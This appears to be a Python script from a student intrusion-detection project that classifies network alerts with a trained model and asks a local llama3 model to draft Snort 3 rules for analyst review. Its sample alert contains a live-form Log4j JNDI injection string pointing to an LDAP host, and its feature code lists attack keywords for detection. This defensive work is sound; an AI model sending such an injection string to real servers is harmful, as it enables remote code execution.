import joblib
import ollama
import pandas as pd
import re

def generate_snort_rule_prompt(alert_info):
    """
    Constructs a detailed prompt for Ollama to generate a Snort rule.
    """
    prompt = f"""
    As a senior cybersecurity analyst, you have been tasked with writing a Snort 3 rule.
    A new, suspicious network event has been detected with the following details:

    - **Alert Message**: "{alert_info['message']}"
    - **Source IP**: {alert_info['source_ip']}
    - **Destination Port**: {alert_info['dest_port']}
    - **Protocol**: {alert_info['protocol']}

    Based on this information, generate a Snort 3 rule that will block future attempts from this specific source IP and also try to detect the payload.
    The rule should be in the correct Snort 3 syntax. For example:
    `alert tcp any any -> $HOME_NET 80 (msg:"..."; content:"..."; sid:1000005; rev:1;)`
    
    Provide only the Snort rule as your response.
    """
    return prompt

def engineer_features_for_prediction(alert_info):
    """ 
    Creates the same engineered features for a single new alert 
    that were used in training.
    """
    message = str(alert_info.get('message', ''))
    
    # 1. Message Length
    message_length = len(message)

    # 2. Special Character Count
    special_chars = r'[\$\{\}\(\)\'\/]'
    special_char_count = len(re.findall(special_chars, message))

    # 3. Malicious Keyword Count
    keywords = ['select', 'union', 'script', 'jndi', 'ldap', 'payload']
    keyword_pattern = '|'.join(keywords)
    keyword_count = len(re.findall(keyword_pattern, message.lower()))

    # Create a dictionary compatible with DataFrame creation
    features = {
        'message': message,
        'dest_port': int(alert_info.get('dest_port', 0)),
        'message_length': message_length,
        'special_char_count': special_char_count,
        'keyword_count': keyword_count
    }
    return features


# --- Main Execution ---
if __name__ == "__main__":
    # 1. Load the pre-trained model pipeline
    try:
        model_pipeline = joblib.load('random_forest_pipeline.joblib')
    except FileNotFoundError:
        print("Error: Model pipeline file 'random_forest_pipeline.joblib' not found.")
        print("Please run the latest train_model.py script first to create it.")
        exit()

    # 2. Simulate a new, unseen, suspicious alert (Log4j)
    new_alert_info = {
        'message': 'GET /?payload=${jndi:ldap://192.168.1.6:1389/a} HTTP/1.1',
        'source_ip': '192.168.1.6',
        'dest_port': '8080',
        'protocol': 'tcp'
    }

    # 3. Engineer features for the new alert
    new_alert_features = engineer_features_for_prediction(new_alert_info)
    
    # Create a pandas DataFrame from the new alert, as the pipeline expects it
    new_alert_df = pd.DataFrame([new_alert_features])

    # 4. Use our improved model pipeline to classify the new alert
    prediction = model_pipeline.predict(new_alert_df)

    # 5. If the model classifies it as malicious, ask Ollama for a rule
    if prediction[0] == 1:
        print(f"SUCCESS: The advanced model correctly classified the new threat as MALICIOUS.")
        print(f"Detected activity: '{new_alert_info['message']}'")
        print("\nAsking Ollama to generate a new Snort rule...")
        
        prompt = generate_snort_rule_prompt(new_alert_info)
        
        try:
            response = ollama.chat(
                model='llama3',
                messages=[{'role': 'user', 'content': prompt}],
                stream=False
            )
            
            suggested_rule = response['message']['content']
            print("\n--- Ollama's Suggested Snort Rule ---")
            print(suggested_rule)
            print("---------------------------------------")

            with open("suggested_rules.txt", "a") as f:
                f.write(suggested_rule + "\n\n")
            print("Rule saved to suggested_rules.txt for analyst review.")

        except Exception as e:
            print(f"\nError communicating with Ollama: {e}")
            print("Please ensure the Ollama service is running and you have the 'llama3' model.")
            
    else:
        print(f"FAILURE: The advanced model still classified the new threat as BENIGN.")
        print("This is a key finding for your report. It indicates the model needs even more diverse data (e.g., real Log4j alerts) to learn from.")